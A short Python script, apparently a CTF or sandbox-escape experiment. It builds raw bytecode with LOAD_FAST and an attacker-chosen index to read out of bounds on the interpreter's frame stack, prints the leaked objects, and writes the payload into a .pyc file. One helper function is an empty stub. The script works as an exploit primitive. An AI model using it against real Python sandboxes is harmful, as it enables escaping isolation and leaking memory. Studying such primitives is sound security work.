from types import CodeType
from opcode import opmap
import importlib

def test_oob():
    # LOAD_CONST
    # LOAD_NAME co_names
    # LOAD_FAST co_varnames
    # LOAD_DEREF fast local stack
    import sys
    n = int(sys.argv[1])
    code = [
        *([opmap["EXTENDED_ARG"], n // 256] if n // 256 != 0 else []),
        opmap["LOAD_FAST"],
        n % 256,
        opmap["RETURN_VALUE"],
        0,
    ]

    c = CodeType(
        0,
        0,
        0,
        0,
        0,
        3,
        bytes(code),
        (),
        (),
        (),
        "<sandbox>",
        "<eval>",
        "",
        0,
        b"",
        b"",
        (),
        (),
    )

    ret = eval(c)
    if ret:
        print(f"{n}: {ret}")
        print(type(ret))
    return c.co_code


def build_prog():
    import opcode
    insts = []

    return b""

payload = test_oob()

code = CodeType(0, 0, 0, 0, 0, 0, payload, (), (), (), "", "", "", 0, b"", b"", (), ())
pyc_data = importlib._bootstrap_external._code_to_timestamp_pyc(code)

with open('a.pyc', 'wb') as f:
    f.write(pyc_data)
